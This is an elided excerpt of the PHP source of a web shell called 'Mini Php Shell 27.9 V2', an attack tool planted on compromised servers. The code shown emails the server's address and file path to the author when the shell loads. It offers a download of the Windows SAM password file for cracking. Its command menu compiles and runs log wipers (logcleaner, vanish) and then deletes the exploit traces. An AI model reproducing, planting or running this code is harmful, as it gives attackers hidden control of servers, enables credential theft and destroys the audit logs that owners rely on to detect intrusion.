...
$r11  = $_SERVER['SERVER_ADDR'];$i94 = $_SERVER['REMOTE_ADDR'];$i71= gethostbyaddr($i94);$h42 = $_SERVER['HTTP_HOST'];$a83 = $_SERVER['REQUEST_URI'];$p77 = __FILE__;$s33 = str_replace('.', '', $r11);$e85 = 'no access email';$f55 = "From: $s33 <no access email>";$m852 = "$i94\n$i71\n\n$h42$a83\n$p77";@mail($e85, $s33, $m852, $f55);
if (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$arr,$k="") {if (is_array($arr)) {foreach($arr as $k=>$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);}
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}}
$shver = "Mini Php Shell 27.9 V2"; 
...
header("Expires: 28 Jul 2011 18:00:52 GMT");
...
<html>
	<head>
		<title>Mini Php Shell 27.9 V2</title>
		<style type="text/css">
			a  {
	...
	<body bgcolor="#000000" background="http://oi52.tinypic.com/sphybr.jpg" link="#444444" vlink="#444444">
	<h1 style='color: #fff'><u><a href="<?php print $_SERVER['PHP_SELF']; ?>" style="color: #fff">
	Mini Php Shell 27.9 V2</a></u></h1>
	<p style="color: #fff">Coded by jos_ali_joe<br><br># web: <u><a" style="display: inline;
	color: #fff">http://devilzc0de.com/</a></u><br> # Contact : failed404@gmail.com </u></p>
...
echo "<table width=\"100%\" id=\"bordered\">
      <tr><td width=\"100%\" valign=\"top\">".$donated_html."</td></tr></table>
	  <br>";
	  }
...
if ($act == "sql")
{
 ...
 ?>
 <TABLE width="100%" id="bordered">
 <tr><td width="100%" height="1" colspan="2" valign="top">
 <center><?php
 if ($sql_server)
 {
  ...
  else
  {
   ...
   if (!empty($sql_act))
   {
    ...
    if ($sql_act == "processes")
    {
     ...
     echo "<TABLE width=100% id=bordered><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>";
...
if ($act == "security")
{
 ...
 else
 {
  ...
  else {echo "</br><b><font color=red>You can crack winnt passwords. <a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Download</b></u></a>, and use lcp.crack+ ?</font></b><br>";}
 }
...
if ($act == "ls")
{
 ...
 else
 {
  ...
  echo "<center><b><u>Listing Folder: ".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders</u></b></center><br>
  <TABLE width=100% id=bordered>
...
?>
</td></tr></table><a bookmark="minipanel"><br><TABLE width=100% id=bordered>
...
<br><TABLE width=100% id=bordered>
<tr>
...
<OPTION VALUE="">                   
  ...
  <OPTION VALUE="uname -a">Kernel version
		   ...
		   <OPTION VALUE="">                   
                    ...
                    <OPTION VALUE="./logcleaner-0.3 <?php echo $_SERVER["REMOTE_ADDR"]; ?>">Wipelogs (Part 3)(Zap3)
                    <OPTION VALUE="Gone!<?php if($_REQUEST['cmd']=="Gone!") { if (file_exists("logcleaner-0.3.c")) { unlink("logcleaner-0.3.c"); } if (file_exists("logcleaner-0.3")) { unlink("logcleaner-0.3"); } } ?>">Remove All Zap3 Traces
                   <OPTION VALUE="">  
                    ...
                    <OPTION VALUE="gcc vanish.c -o vanish">Wipelogs (Part 2)(Vanish)
                     <OPTION VALUE="./vanish <?php echo exec('whoami'); ?> <?php echo $_SERVER["REMOTE_ADDR"]; ?> <?php echo gethostbyname($_SERVER["HTTP_HOST"]); ?>">Wipelogs (Part 3)(Vanish)
                    <OPTION VALUE="Gone!!<?php if($_REQUEST['cmd']=="Gone!!") { if (file_exists("vanish.c")) { unlink("vanish.c"); } if (file_exists("vanish")) { unlink("vanish"); } } ?>">Remove All Vanish Traces
                   <OPTION VALUE=""> 
		   ...
		   <OPTION VALUE=""> 
                   ...
                   <OPTION VALUE="Gone!!!<?php if($_REQUEST['cmd']=="Gone!!!") { if (file_exists("exploit.c")) { unlink("exploit.c"); } if (file_exists("1.txt")) { unlink("1.txt"); } if (file_exists("exploit")) { unlink("exploit"); } } ?>">Remove All Exploit Traces
                    </SELECT>
...
<br><TABLE width=100% id=bordered><tr><td width="50%" height="1" valign="top"><center>
